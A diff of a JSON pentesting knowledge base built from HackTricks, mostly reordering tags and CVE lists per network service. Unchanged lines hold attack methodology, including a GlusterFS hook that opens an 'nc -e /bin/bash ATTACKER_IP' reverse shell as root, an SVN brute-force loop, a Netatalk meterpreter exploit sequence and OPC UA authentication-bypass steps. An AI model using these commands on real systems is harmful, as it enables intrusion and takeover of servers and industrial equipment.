@@ -22,8 +22,8 @@
   "kill_chain_phase": "ENUMERATION",
   "source": "hacktricks",
   "tags": [
-   "10000",
-   "10000 network data management protocol ndmp"
+   "10000 network data management protocol ndmp",
+   "10000"
   ]
  },
  {
@@ -188,8 +188,8 @@
   "kill_chain_phase": "ENUMERATION",
   "source": "hacktricks",
   "tags": [
-   "1080 pentesting socks",
-   "1080"
+   "1080",
+   "1080 pentesting socks"
   ]
  },
  {
@@ -366,8 +366,8 @@
   "kill_chain_phase": "ENUMERATION",
   "source": "hacktricks",
   "tags": [
-   "1099",
-   "java-rmi"
+   "java-rmi",
+   "1099"
   ]
  },
  {
@@ -552,10 +552,10 @@
   "kill_chain_phase": "ENUMERATION",
   "source": "hacktricks",
   "tags": [
-   "auxiliary/scanner/memcached/memcached_amp",
    "0",
    "auxiliary/gather/memcached_extractor",
-   "readme"
+   "readme",
+   "auxiliary/scanner/memcached/memcached_amp"
   ]
  },
  {
@@ -820,8 +820,8 @@
   "kill_chain_phase": "EXPLOITATION",
   "source": "hacktricks",
   "tags": [
-   "memcache commands",
-   "0"
+   "0",
+   "memcache commands"
   ]
  },
  {
@@ -1008,8 +1008,8 @@
   "kill_chain_phase": "RECON",
   "source": "hacktricks",
   "tags": [
-   "113 pentesting ident",
-   "113"
+   "113",
+   "113 pentesting ident"
   ]
  },
  {
@@ -1156,10 +1156,10 @@
   "source": "hacktricks",
   "tags": [
    "auxiliary/scanner/dcerpc/endpoint_mapper",
-   "auxiliary/scanner/dcerpc/hidden",
+   "135",
    "msrpc",
    "auxiliary/scanner/dcerpc/tcp_dcerpc_auditor",
-   "135",
+   "auxiliary/scanner/dcerpc/hidden",
    "auxiliary/scanner/dcerpc/management"
   ]
  },
@@ -1617,10 +1617,10 @@
   "kill_chain_phase": "ENUMERATION",
   "source": "hacktricks",
   "tags": [
-   "post/punch-q)**,",
    "1414 pentesting ibmmq",
-   "1414",
-   "post/punch-q)"
+   "post/punch-q)**,",
+   "post/punch-q)",
+   "1414"
   ]
  },
  {
@@ -1832,8 +1832,8 @@
   "kill_chain_phase": "ENUMERATION",
   "source": "hacktricks",
   "tags": [
-   "15672",
-   "15672 pentesting rabbitmq management"
+   "15672 pentesting rabbitmq management",
+   "15672"
   ]
  },
  {
@@ -1859,8 +1859,8 @@
   "kill_chain_phase": "ENUMERATION",
   "source": "hacktricks",
   "tags": [
-   "1723",
-   "1723 pentesting pptp"
+   "1723 pentesting pptp",
+   "1723"
   ]
  },
  {
@@ -2312,9 +2312,9 @@
   "kill_chain_phase": "ENUMERATION",
   "source": "hacktricks",
   "tags": [
-   "2375",
    "exploit/linux/http/docker_daemon_tcp",
-   "2375 pentesting docker"
+   "2375 pentesting docker",
+   "2375"
   ]
  },
  {
@@ -2377,9 +2377,9 @@
   "exploitation_commands": [],
   "default_credentials": [],
   "common_vulnerabilities": [
-   "CVE-2023-26253",
+   "CVE-2022-48340",
    "CVE-2023-3775",
-   "CVE-2022-48340"
+   "CVE-2023-26253"
   ],
   "privilege_escalation": [],
   "methodology": "## Basic Information\n**GlusterFS** is a **distributed file system** that combines storage from multiple servers into one **unified namespace**. The management daemon (`glusterd`) listens by default on **24007/TCP** and instructs data-plane bricks that start at **49152/TCP** (one port per brick, incrementing). Versions prior to 9.x used **24008–24009/TCP** for brick transport, so you will still encounter those ports in legacy clusters.\n\n```\nPORT      STATE  SERVICE        VERSION\n24007/tcp open   glusterd       GlusterFS (RPC)\n49152/tcp open   gluster-brick  SSL (TLS optional)\n```\n\n> Tip: 24007 answers RPC calls even when the storage-only nodes do **not** export any volume; therefore the service is a reliable pivot target inside large infrastructures.\n\n## Enumeration\nInstall the client utilities on your attacking box:\n\n```bash\nsudo apt install -y glusterfs-cli glusterfs-client   # Debian/Ubuntu\n```\n\n1. **Peer discovery & health**\n\n```bash\n\n## List peers (works without authentication in default setups)\ngluster --remote-host 10.10.11.131 peer status\n```\n\n2. **Volume reconnaissance**\n\n```bash\n\n## Retrieve the list of all volumes and their configuration\ngluster --remote-host 10.10.11.131 volume info all\n```\n\n3. **Mount without privileges**\n\n```bash\nsudo mount -t glusterfs 10.10.11.131:/<vol_name> /mnt/gluster\n```\n\nIf mounting fails, check `/var/log/glusterfs/<vol_name>-<uid>.log` on the client side.  Common issues are:\n\n* TLS enforcement (`option transport.socket.ssl on`)\n* Address based access control (`option auth.allow <cidr>`)\n\n## Certificate troubleshooting\nSteal the following files from any authorised client node and place them in `/etc/ssl/` (or the directory shown in the error log):\n\n```\n/etc/ssl/glusterfs.pem\n/etc/ssl/glusterfs.key\n/etc/ssl/glusterfs.ca\n```\n\n---\n\n## Known Vulnerabilities (2022-2025)\n| CVE | Affected versions | Impact | Notes |\n|-----|-------------------|--------|-------|\n| **CVE-2022-48340** | 10.0–10.4, 11.0 | Use-after-free in `dht_setxattr_mds_cbk` reachable through the network | Remote **DoS** and probable RCE. Fixed in 10.4.1 / 11.1. |\n| **CVE-2023-26253** | < 11.0 | Out-of-bounds read in FUSE notify handler | Remote crash via crafted FS operations; public PoC available. |\n| **CVE-2023-3775** | < 10.5 / 11.1 | Incorrect permission validation when mounting `gluster_shared_storage` | Lets any unauthenticated client mount the admin volume – leads to **priv-esc** explained below. |\n\n> Always check `gluster --version` **on every node**; heterogeneous clusters are common after partial upgrades.\n\n## Exploiting `gluster_shared_storage` (Privilege Escalation)\nEven in recent versions many administrators leave the special `gluster_shared_storage` volume world-readable because it simplifies geo-replication.  The volume contains cronjob templates that run with **root** on every node.\n\n```bash\n\n## 1. Mount admin volume anonymously\nmkdir /tmp/gss && sudo mount -t glusterfs 10.10.11.131:/gluster_shared_storage /tmp/gss\n\n## 2. Drop malicious script that gets synchronised cluster-wide\ncat <<'EOF' > /tmp/gss/hooks/1/start/post/test.sh\n#!/bin/bash\nnc -e /bin/bash ATTACKER_IP 4444 &\nEOF\nchmod +x /tmp/gss/hooks/1/start/post/test.sh\n\n## 3. Wait until glusterd distributes the hook and executes it as root\n```\n\nIf `hooks/1/` is not present, look for `/ss_bricks/` – the exact path may vary with the major version.",
@@ -2387,9 +2387,9 @@
   "kill_chain_phase": "RECON",
   "source": "hacktricks",
   "tags": [
-   "post/test.sh",
    "24007",
-   "24007 24008 24009 49152 pentesting glusterfs"
+   "24007 24008 24009 49152 pentesting glusterfs",
+   "post/test.sh"
   ]
  },
  {
@@ -2752,8 +2752,8 @@
   "kill_chain_phase": "ENUMERATION",
   "source": "hacktricks",
   "tags": [
-   "3260 pentesting iscsi",
-   "3260"
+   "3260",
+   "3260 pentesting iscsi"
   ]
  },
  {
@@ -2825,11 +2825,11 @@
   "kill_chain_phase": "ENUMERATION",
   "source": "hacktricks",
   "tags": [
-   "auxiliary/scanner/sap/sap_router_info_request",
+   "auxiliary/scanner/sap/sap_service_discovery",
    "post/2014/01/09/piercing-saprouter-with-metasploit/](https://www.rapid7.com/blog/post/2014/01/09/piercing-saprouter-with-metasploit/)",
    "3299 pentesting saprouter",
-   "auxiliary/scanner/sap/sap_service_discovery",
-   "3299"
+   "3299",
+   "auxiliary/scanner/sap/sap_router_info_request"
   ]
  },
  {
@@ -2876,10 +2876,10 @@
   "kill_chain_phase": "ENUMERATION",
   "source": "hacktricks",
   "tags": [
+   "distcc",
    "exploit/unix/misc/distcc_exec](https://www.rapid7.com/db/modules/exploit/unix/misc/distcc_exec)",
    "exploit/unix/misc/distcc_exec",
-   "3632",
-   "distcc"
+   "3632"
   ]
  },
  {
@@ -2951,8 +2951,8 @@
    }
   ],
   "common_vulnerabilities": [
-   "CVE-2024-45720",
-   "CVE-2024-46901"
+   "CVE-2024-46901",
+   "CVE-2024-45720"
   ],
   "privilege_escalation": [],
   "methodology": "## Basic Information\n**Subversion (SVN)** is a centralized **version control system** (Apache license) used for software versioning and revision control.\n\n**Default port:** `3690/tcp` (svnserve). It can also be exposed via **HTTP/HTTPS** through `mod_dav_svn` and via **svn+ssh**.\n\n```text\nPORT     STATE SERVICE\n3690/tcp open  svnserve Subversion\n```\n\n## Banner Grabbing\n```bash\nnc -vn 10.10.10.10 3690\nsvnserve --version           # if shell access is obtained\nsvn --version                # client version leak via error messages\n```\n\n## Anonymous / authenticated listing\nsvn ls svn://10.10.10.203                  # list root\nsvn ls -R svn://10.10.10.203/repo         # recursive list\nsvn info svn://10.10.10.203/repo          # repo metadata\nsvn log svn://10.10.10.203/repo           # commit history\nsvn checkout svn://10.10.10.203/repo      # checkout repository\nsvn up -r 2                               # move working copy to revision 2\nsvn diff -r 1:HEAD svn://10.10.10.203/repo   # view changes\n\n## If served over HTTP(S)\nsvn ls https://10.10.10.10/svn/repo --username guest --password ''\n\n## Extract revision props (often contain build creds, URLs, tokens)\nsvn propget --revprop -r HEAD svn:log svn://10.10.10.203/repo\n```\n\n## Auth & Misconfig Hunting\n- `svnserve.conf` may allow `anon-access = read` (or even write). If you can list, try `checkout` to dump secrets, scripts, CI tokens.\n- Repositories frequently store **build pipelines**, **deployment keys**, and **database credentials** in versioned config files. Grep the working copy after checkout: `grep -R \"password\\|secret\\|token\" -n .`.\n- If svn+ssh is enabled, user shells often allow restricted `svnserve` commands; attempt `ssh user@host svnserve -t` with crafted subcommands to bypass wrappers.\n\n## Bruteforcing credentials (svnserve)\n`sasl` authentication (if enabled) and simple password files are protected only by the transport; no lockout by default. A quick Bash loop can try credentials:\n```bash\nfor u in admin dev ci; do\n  for p in $(cat /tmp/passlist); do\n    svn ls --username \"$u\" --password \"$p\" svn://10.10.10.203/repo 2>/dev/null && echo \"[+] $u:$p\" && break\n  done\ndone\n```\n\n## mod_dav_svn DoS via control characters (CVE-2024-46901)\n- A user with commit rights can write a path containing control chars (e.g. `\\x01`, `\\x7f`) that **corrupts the repository**, making later checkouts/logs fail and potentially crashing `mod_dav_svn` workers.\n- Affects Subversion ≤ **1.14.4** when served through **HTTP(S)** (`mod_dav_svn`). Fixed in **1.14.5**.\n- PoC commit with `svnmucc` (requires valid commit creds):\n```bash\n\n## commit a path with a control character in its name\nsvnmucc -m \"DoS\" put /tmp/payload $'http://10.10.10.10/svn/repo/trunk/bad\\x01path.txt'\n```\n- After the commit, normal clients may crash or refuse updates until admins manually remove the revision with `svnadmin dump/filter/load`.\n\n## Windows argument injection in svn client (CVE-2024-45720)\n- On Windows, \"best-fit\" character encoding in `svn.exe` allows **command-line argument injection** when processing specially crafted non‑ASCII paths/URLs, potentially leading to arbitrary program execution.\n- Affects Subversion ≤ **1.14.3** on Windows only; fixed in **1.14.4**. Attack surface: phishing a developer to run `svn` on an attacker-controlled URL/path.\n- Pentest angle: if you control a network share or ZIP given to a Windows dev, name a repo URL or working-copy path containing best-fit bytes that decode into `\" & calc.exe & \"`-style injected args, then trick the victim to run `svn status` or similar on that path.",
@@ -2960,8 +2960,8 @@
   "kill_chain_phase": "ENUMERATION",
   "source": "hacktricks",
   "tags": [
-   "3690 pentesting subversion svn server",
-   "3690"
+   "3690",
+   "3690 pentesting subversion svn server"
   ]
  },
  {
@@ -3023,8 +3023,8 @@
   "kill_chain_phase": "GENERAL",
   "source": "hacktricks",
   "tags": [
-   "3702 udp pentesting ws discovery",
-   "3702"
+   "3702",
+   "3702 udp pentesting ws discovery"
   ]
  },
  {
@@ -3111,8 +3111,8 @@
   "kill_chain_phase": "ENUMERATION",
   "source": "hacktricks",
   "tags": [
-   "4222",
-   "4222 pentesting nats"
+   "4222 pentesting nats",
+   "4222"
   ]
  },
  {
@@ -3221,8 +3221,8 @@
   "kill_chain_phase": "ENUMERATION",
   "source": "hacktricks",
   "tags": [
-   "43 pentesting whois",
-   "43"
+   "43",
+   "43 pentesting whois"
   ]
  },
  {
@@ -3398,8 +3398,8 @@
   "kill_chain_phase": "ENUMERATION",
   "source": "hacktricks",
   "tags": [
-   "4369",
    "exploit/multi/misc/erlang_cookie_rce",
+   "4369",
    "erlang"
   ]
  },
@@ -3742,8 +3742,8 @@
   "kill_chain_phase": "EXPLOITATION",
   "source": "hacktricks",
   "tags": [
-   "4786 cisco smart install",
-   "4786"
+   "4786",
+   "4786 cisco smart install"
   ]
  },
  {
@@ -3762,10 +3762,10 @@
   "exploitation_commands": [],
   "default_credentials": [],
   "common_vulnerabilities": [
+   "CVE-2025-7390",
    "CVE-2024-53429",
-   "CVE-2024-42512",
    "CVE-2024-42513",
-   "CVE-2025-7390"
+   "CVE-2024-42512"
   ],
   "privilege_escalation": [],
   "methodology": "## Basic Information\n**OPC UA**, standing for **Open Platform Communications Unified Access**, is a crucial open-source protocol used in various industries like Manufacturing, Energy, Aerospace, and Defence for data exchange and equipment control. It uniquely enables different vendors' equipment to communicate, especially with PLCs.\n\nIts configuration allows for strong security measures, but often, for compatibility with older devices, these are lessened, exposing systems to risks. Additionally, finding OPC UA services can be tricky since network scanners might not detect them if they're on nonstandard ports.\n\n**Default port:** 4840 (binary `opc.tcp`). Many vendors expose separate discovery endpoints (`/discovery`), HTTPS bindings (4843/443), or vendor-specific listener ports such as 49320 (KepServerEX), 62541 (OPC Foundation reference stack) and 48050 (UaGateway). Expect multiple endpoints per host, each advertising transport profile, security policy and user-token support.\n\n| Built-in NodeId | Why it mat\n\n## Pentesting OPC UA\nTo reveal security issues in OPC UA servers, scan it with [OpalOPC](https://opalopc.com/).\n\n```bash\nopalopc -vv opc.tcp://$target_ip_or_hostname:$target_port\n```\n\n## Discovery & Enumeration Playbook\n1. **Locate all OPC UA transports**\n   ```bash\n   nmap -sV -Pn -n --open -p 4840,4843,49320,48050,53530,62541 $TARGET\n   ```\n   Repeat on UDP group addresses if the environment uses LDS-ME multicast discovery.\n\n2. **Fingerprint endpoints**\n   - Invoke `FindServers`/`GetEndpoints` over each transport to capture `SecurityPolicyUri`, `SecurityMode`, `UserTokenType`, application URI and product strings.\n   - Enumerate namespaces so you can resolve vendor-specific NodeIds; abuse namespace collisions to coax clients into loading attacker-controlled schemas.\n\n3. **Walk the address space**\n   - Start at `ObjectsFolder (i=85)` and recursively `Browse`/`Read` to find writable process variables, `Method` nodes and historian/log nodes.\n   - Query `ServerStatus.BuildInfo` to understand firmware provenance, and `ServerCapabilities.OperationLimits` to gauge how easy it is to exhaust server resources.\n   - If anonymous access is allowed, immediately test `Call` on maintenance methods (e.g., `ns=2;s=Re\n\n## Automated assessment with OpalOPC\n- The scanner can run interactively or headless, which is handy for CI/CD style OT baselines. Pipe its machine-readable findings into your reporting pipeline to highlight anonymous logins, weak policies, certificate validation errors and writable variables in minutes.\n- Combine OpalOPC output with manual browsing: feed the discovered endpoint list back into your custom tooling, then selectively weaponize high-impact nodes (e.g., `MotorControl/StartStop`, `RecipeManager/Upload`).\n\n## Attacking legacy security policies (Basic128Rsa15)\n- **Bleichenbacher-style oracle:** Systems that still allow the deprecated `Basic128Rsa15` policy (often toggled via build flags such as `CMPOPCUASTACK_ALLOW_SHA1_BASED_SECURITY`) leak padding validation differences. Exploit this by flooding `CreateSession` / `OpenSecureChannel` handshakes with crafted PKCS#1 v1.5 blobs to recover the server certificate’s private key, then impersonate the server or decrypt traffic.\n- **Authentication bypass:** OPC Foundation’s .NET Standard stack prior to 1.5.374.158 (CVE-2024-42512) and dependent products let unauthenticated attackers force that legacy policy and subsequently skip application-level authentication. Once you own the key material you can present arbitrary `UserIdentityTokens`, replay signed `ActivateSession` requests, and operate the plant as a trusted engineering workstation.\n- **Operational workflow:**\n  1. Enumerate policies with `GetEndpoints` and note any `Basic128Rsa15` entries.\n  2. Negotiate that policy explicitly (`SecurityPolic\n\n## 2024-2025 exploit watchlist\n- **open62541 fuzz_binary_decode (CVE-2024-53429):** SecureChannel chunks that declare oversized `ExtensionObject` bodies make the decoder dereference freed memory, so a pre-auth attacker can repeatedly crash UA servers that embed open62541 ≤1.4.6. Reuse the Claroty corpus (`opcua_message_boofuzz_db`) or craft your own Boofuzz harness to spam mutated `OpenSecureChannel` requests until the watchdog kills the process, then re-enumerate because many integrators fall back to anonymous mode after the reboot.\n- **Softing OPC UA C++ SDK / edgeConnector / edgeAggregator (CVE-2025-7390):** The TLS client-auth pipeline accepts any certificate that replays a trusted Common Name, so you can mint a throwaway cert, copy the CN from a plant engineer, and log in with arbitrary `UserNameIdentityToken` or `IssuedIdentityToken` data. Pair this with a downgrade to Basic128Rsa15 to strip integrity checks and persistently impersonate operators until trustlists are rebuilt.\n\n## Crafting OPC UA clients for exploitation\n- **Custom clients:** Drop-in libraries (python-opcua/asyncua, node-opcua, open62541) let you drive exploit logic yourself. Always enfo",
@@ -3773,8 +3773,8 @@
   "kill_chain_phase": "ENUMERATION",
   "source": "hacktricks",
   "tags": [
-   "4840 pentesting opc ua",
-   "4840"
+   "4840",
+   "4840 pentesting opc ua"
   ]
  },
  {
@@ -3813,8 +3813,8 @@
   "kill_chain_phase": "EXPLOITATION",
   "source": "hacktricks",
   "tags": [
-   "49 pentesting tacacs+",
-   "49"
+   "49",
+   "49 pentesting tacacs+"
   ]
  },
  {
@@ -4231,11 +4231,11 @@
   "kill_chain_phase": "ENUMERATION",
   "source": "hacktricks",
   "tags": [
-   "auxiliary/scanner/rservices/rexec_login",
-   "auxiliary/scanner/rservices/rexec_login](https://www.rapid7.com/db/modules/auxiliary/scanner/rservices/rexec_login)",
-   "512",
    "rexec",
-   "auxiliary/scanner/rservices/rexec_login`"
+   "512",
+   "auxiliary/scanner/rservices/rexec_login`",
+   "auxiliary/scanner/rservices/rexec_login",
+   "auxiliary/scanner/rservices/rexec_login](https://www.rapid7.com/db/modules/auxiliary/scanner/rservices/rexec_login)"
   ]
  },
  {
@@ -4254,8 +4254,8 @@
   "kill_chain_phase": "EXPLOITATION",
   "source": "hacktricks",
   "tags": [
-   "515",
-   "lpd"
+   "lpd",
+   "515"
   ]
  },
  {
@@ -4281,12 +4281,12 @@
   "exploitation_commands": [],
   "default_credentials": [],
   "common_vulnerabilities": [
-   "CVE-2023-1981",
-   "CVE-2025-31222",
-   "CVE-2023-38469",
    "cve-2024-44183",
-   "CVE-2024-44183",
    "cve-2025-31222",
+   "CVE-2023-1981",
+   "CVE-2024-44183",
+   "CVE-2023-38469",
+   "CVE-2025-31222",
    "CVE-2024-20303"
   ],
   "privilege_escalation": [],
@@ -4295,8 +4295,8 @@
   "kill_chain_phase": "ENUMERATION",
   "source": "hacktricks",
   "tags": [
-   "5353 udp multicast dns mdns",
-   "5353"
+   "5353",
+   "5353 udp multicast dns mdns"
   ]
  },
  {
@@ -4403,8 +4403,8 @@
   "kill_chain_phase": "ENUMERATION",
   "source": "hacktricks",
   "tags": [
-   "554",
-   "rtsp"
+   "rtsp",
+   "554"
   ]
  },
  {
@@ -4488,8 +4488,8 @@
   "kill_chain_phase": "EXPLOITATION",
   "source": "hacktricks",
   "tags": [
-   "kibana",
-   "5601"
+   "5601",
+   "kibana"
   ]
  },
  {
@@ -4663,8 +4663,8 @@
    }
   ],
   "common_vulnerabilities": [
-   "cve-2024-51988",
    "CVE-2024-51988",
+   "cve-2024-51988",
    "CVE-2025-50200"
   ],
   "privilege_escalation": [],
@@ -4673,8 +4673,8 @@
   "kill_chain_phase": "ENUMERATION",
   "source": "hacktricks",
   "tags": [
-   "5671 5672 pentesting amqp",
-   "5671"
+   "5671",
+   "5671 5672 pentesting amqp"
   ]
  },
  {
@@ -4781,10 +4781,10 @@
   ],
   "default_credentials": [],
   "common_vulnerabilities": [
-   "CVE-2018-1160",
-   "CVE-2022-22995",
    "CVE-2010-0533",
-   "CVE-2022-23121"
+   "CVE-2022-23121",
+   "CVE-2022-22995",
+   "CVE-2018-1160"
   ],
   "privilege_escalation": [],
   "methodology": "## Basic Information\nThe **Apple Filing Protocol** (**AFP**), once known as AppleTalk Filing Protocol, is a specialized network protocol included within **Apple File Service** (**AFS**). It is designed to provide file services for macOS and the classic Mac OS. AFP stands out for supporting Unicode file names, POSIX-style and ACL permissions, resource forks, named extended attributes and sophisticated file-locking mechanisms.\n\nAlthough AFP has been superseded by SMB in modern macOS releases (SMB is the default since OS X 10.9), it is still encountered in:\n\n* Legacy macOS / Mac OS 9 environments\n* NAS appliances (QNAP, Synology, Western Digital, TrueNAS…) that embed the open-source **Netatalk** daemon\n* Mixed-OS networks where Time-Machine-over-AFP is still enabled\n\n**Default TCP Port:** **548** (AFP over TCP / DSI)\n\n```bash\nPORT     STATE SERVICE\n548/tcp  open  afp\n```\n\n---\n\n## Metasploit auxiliary\nuse auxiliary/scanner/afp/afp_server_info\nrun RHOSTS=<IP>\n\n## Nmap NSE\nnmap -p 548 -sV --script \"afp-* and not dos\" <IP>\n```\n\nUseful AFP NSE scripts:\n\n| Script | What it does |\n|--------|--------------|\n| **afp-ls**            | List available AFP volumes and files |\n| **afp-brute**         | Password brute-force against AFP login |\n| **afp-serverinfo**    | Dump server name, machine type, AFP version, supported UAMs, etc. |\n| **afp-showmount**     | List shares together with their ACLs |\n| **afp-path-vuln**     | Detects (and can exploit) directory-traversal, CVE-2010-0533 |\n\nThe NSE brute-force script can be combined with Hydra/Medusa if more control is required:\n\n```bash\nhydra -L users.txt -P passwords.txt afp://<IP>\n```\n\n## or from terminal\nmkdir /Volumes/afp\nmount_afp afp://USER:[email protected]/SHARE /Volumes/afp\n```\n\n*Linux* (using `afpfs-ng` ‑ packaged in most distros)\n```bash\napt install afpfs-ng\nmkdir /mnt/afp\nmount_afp afp://USER:[email protected]/SHARE /mnt/afp\n\n## or interactive client\nafp_client <IP>\n```\n\nOnce mounted, remember that classic Mac resource-forks are stored as hidden `._*` AppleDouble files – these often hold interesting metadata that DFIR tools miss.\n\n---\n\n## Netatalk unauthenticated RCE chain (2022)\nSeveral NAS vendors shipped **Netatalk ≤3.1.12**. A lack of bounds checking in `parse_entries()` allows an attacker to craft a malicious **AppleDouble** header and obtain **remote root** before authentication (**CVSS 9.8 – CVE-2022-23121**). A full write-up by NCC Group with PoC exploiting Western-Digital PR4100 is available.\n\nMetasploit (>= 6.3) ships the module `exploit/linux/netatalk/parse_entries` which delivers the payload via DSI `WRITE`.\n\n```bash\nuse exploit/linux/netatalk/parse_entries\nset RHOSTS <IP>\nset TARGET 0   # Automatic (Netatalk)\nset PAYLOAD linux/x64/meterpreter_reverse_tcp\nrun\n```\n\nIf the target runs an affected QNAP/Synology firmware, successful exploitation yields a shell as **root**.\n\n## Netatalk OpenSession heap overflow (2018)\nOlder Netatalk (3.0.0 - 3.1.11) is vulnerable to an out-of-bounds write in the **DSI OpenSession** handler allowing unauthenticated code execution (**CVE-2018-1160**). A detailed analysis and PoC were published by Tenable Research.\n\n## Other notable issues\n* **CVE-2022-22995** – Symlink redirection leading to arbitrary file write / RCE when AppleDouble v2 is enabled (3.1.0 - 3.1.17).\n* **CVE-2010-0533** – Directory traversal in Apple Mac OS X 10.6 AFP (detected by `afp-path-vuln.nse`).\n* Multiple memory-safety bugs were fixed in **Netatalk 4.x (2024)** – recommend upgrading rather than patching individual CVEs.\n\n---\n\n## Defensive Recommendations\n1. **Disable AFP** unless strictly required – use SMB3 or NFS instead.\n2. If AFP must stay, **upgrade Netatalk to ≥ 3.1.18 or 4.x**, or apply vendor firmware that back-ports the 2022/2023/2024 patches.\n3. Enforce **Strong UAMs** (e.g. *DHX2*), disable clear-text and guest logins.\n4. Restrict TCP 548 to trusted subnets and wrap AFP inside a VPN when exposed remotely.\n5. Periodically scan with `nmap -p 548 --script afp-*` in CI/CD to catch rogue / downgraded appliances.\n\n---\n\n## References\n* Netatalk Security Advisory CVE-2022-23121 – \"Arbitrary code execution in parse_entries\" <https://netatalk.io/security/CVE-2022-23121>\n* Tenable Research – \"Exploiting an 18-Year-Old Bug (CVE-2018-1160)\" <https://medium.com/tenable-techblog/exploiting-an-18-year-old-bug-b47afe54172>\n{{#include ../banners/hacktricks-training.md}}",
@@ -4792,11 +4792,11 @@
   "kill_chain_phase": "ENUMERATION",
   "source": "hacktricks",
   "tags": [
-   "584",
-   "584 pentesting afp",
+   "exploit/linux/netatalk/parse_entries`",
    "auxiliary/scanner/afp/afp_server_info",
    "exploit/linux/netatalk/parse_entries",
-   "exploit/linux/netatalk/parse_entries`"
+   "584",
+   "584 pentesting afp"
   ]
  },
  {
@@ -5130,10 +5130,10 @@
   ],
   "default_credentials": [],
   "common_vulnerabilities": [
+   "CVE-2018-8007",
    "cve-2018-8007",
-   "CVE-2017-12636",
    "CVE-2017-12635",
-   "CVE-2018-8007"
+   "CVE-2017-12636"
   ],
   "privilege_escalation": [],
   "methodology": "## **Basic Information**\n**CouchDB** is a versatile and powerful **document-oriented database** that organizes data using a **key-value map** structure within each **document**. Fields within the document can be represented as **key/value pairs, lists, or maps**, providing flexibility in data storage and retrieval.\n\nEvery **document** stored in CouchDB is assigned a **unique identifier** (`_id`) at the document level. Additionally, each modification made and saved to the database is assigned a **revision number** (`_rev`). This revision number allows for efficient **tracking and management of changes**, facilitating easy retrieval and synchronization of data within the database.\n\n**Default port:** 5984(http), 6984(https)\n\n```\nPORT      STATE SERVICE REASON\n5984/tcp  open  unknown syn-ack\n```\n\n## **Automatic Enumeration**\n```bash\nnmap -sV --script couchdb-databases,couchdb-stats -p <PORT> <IP>\nmsf> use auxiliary/scanner/couchdb/couchdb_enum\n```\n\n## Banner\n```\ncurl http://IP:5984/\n```\n\nThis issues a GET request to installed CouchDB instance. The reply should look something like on of the following:\n\n```bash\n{\"couchdb\":\"Welcome\",\"version\":\"0.10.1\"}\n{\"couchdb\":\"Welcome\",\"version\":\"2.0.0\",\"vendor\":{\"name\":\"The Apache Software Foundation\"}}\n```\n\n> [!TIP]\n> Note that if accessing the root of couchdb you receive a `401 Unauthorized` with something like this: `{\"error\":\"unauthorized\",\"reason\":\"Authentication required.\"}` **you won't be able to access** the banner or any other endpoint.\n\n## Info Enumeration\nThese are the endpoints where you can access with a **GET** request and extract some interesting info. You can find [**more endpoints and more detailed descriptions in the couchdb documentation**](https://docs.couchdb.org/en/latest/api/index.html).\n\n- **`/_active_tasks`** List of running tasks, including the task type, name, status and process ID.\n- **`/_all_dbs`** Returns a list of all the databases in the CouchDB instance.\n- **`/_cluster_setup`**Returns the status of the node or cluster, per the cluster setup wizard.\n- **`/_db_updates`** Returns a list of all database events in the CouchDB instance. The existence of the `_global_changes` database is required to use this endpoint.\n- **`/_membership`** Displays the nodes that are part of the cluster as `cluster_nodes`. The field `all_nodes` displays all nodes this node knows about, including the ones that are part of the cluster.\n- **`/_scheduler/jobs`** List of replication jobs. Each job description will include source and target info\n\n## **Database List**\n```\ncurl -X GET http://IP:5984/_all_dbs\n```\n\nIf that request **responds with a 401 unauthorised**, then you need some **valid credentials** to access the database:\n\n```\ncurl -X GET http://user:password@IP:5984/_all_dbs\n```\n\nIn order to find valid Credentials you could **try to** [**bruteforce the service**](../generic-hacking/brute-force.md#couchdb).\n\nThis is an **example** of a couchdb **response** when you have **enough privileges** to list databases (It's just a list of dbs):\n\n```bash\n[\"_global_changes\",\"_metadata\",\"_replicator\",\"_users\",\"passwords\",\"simpsons\"]\n```\n\n## Database Info\nYou can obtain some database info (like number of files and sizes) accessing the database name:\n\n```bash\ncurl http://IP:5984/<database>\ncurl http://localhost:5984/simpsons\n#Example response:\n{\"db_name\":\"simpsons\",\"update_seq\":\"7-g1AAAAFTeJzLYWBg4MhgTmEQTM4vTc5ISXLIyU9OzMnILy7JAUoxJTIkyf___z8rkQmPoiQFIJlkD1bHjE-dA0hdPFgdAz51CSB19WB1jHjU5bEASYYGIAVUOp8YtQsgavfjtx-i9gBE7X1i1D6AqAX5KwsA2vVvNQ\",\"sizes\":{\"file\":62767,\"external\":1320,\"active\":2466},\"purge_seq\":0,\"other\":{\"data_size\":1320},\"doc_del_count\":0,\"doc_count\":7,\"disk_size\":62767,\"disk_format_version\":6,\"data_size\":2466,\"compact_running\":false,\"instance_start_time\":\"0\"}\n```\n\n## **Document List**\nList each entry inside a database\n\n```bash\ncurl -X GET http://IP:5984/{dbname}/_all_docs\ncurl http://localhost:5984/simpsons/_all_docs\n#Example response:\n{\"total_rows\":7,\"offset\":0,\"rows\":[\n{\"id\":\"f0042ac3dc4951b51f056467a1000dd9\",\"key\":\"f0042ac3dc4951b51f056467a1000dd9\",\"value\":{\"rev\":\"1-fbdd816a5b0db0f30cf1fc38e1a37329\"}},\n{\"id\":\"f53679a526a868d44172c83a61000d86\",\"key\":\"f53679a526a868d44172c83a61000d86\",\"value\":{\"rev\":\"1-7b8ec9e1c3e29b2a826e3d14ea122f6e\"}},\n{\"id\":\"f53679a526a868d44172c83a6100183d\",\"key\":\"f53679a526a868d44172c83a6100183d\",\"value\":{\"rev\":\"1-e522ebc6aca87013a89dd4b37b762bd3\"}},\n{\"id\":\"f53679a526a868d44172c83a61002980\",\"key\":\"f53679a526a868d44172c83a61002980\",\"value\":{\"rev\":\"1-3bec18e3b8b2c41797ea9d61a01c7cdc\"}},\n{\"id\":\"f53679a526a868d44172c83a61003068\",\"key\":\"f53679a526a868d44172c83a61003068\",\"value\":{\"rev\":\"1-3d2f7da6bd52442e4598f25cc2e84540\"}},\n{\"id\":\"f53679a526a868d44172c83a61003a2a\",\"key\":\"f53679a526a868d44172c83a61003a2a\",\"value\":{\"rev\":\"1-4446bfc0826ed3d81c9115e45\n\n## **Read Document**\nRead the content of a document inside a database:\n\n```bash\ncurl -X GET http://IP:5984/{dbname}/{id}\ncurl http://localhost:5984/simpsons/f0042ac3dc4951b51f056467a1000dd9\n#Example respo",
@@ -5141,9 +5141,9 @@
   "kill_chain_phase": "ENUMERATION",
   "source": "hacktricks",
   "tags": [
+   "5984",
    "auxiliary/scanner/couchdb/couchdb_enum",
-   "5984 pentesting couchdb",
-   "5984"
+   "5984 pentesting couchdb"
   ]
  },
  {
@@ -5967,10 +5967,10 @@
   "kill_chain_phase": "ENUMERATION",
   "source": "hacktricks",
   "tags": [
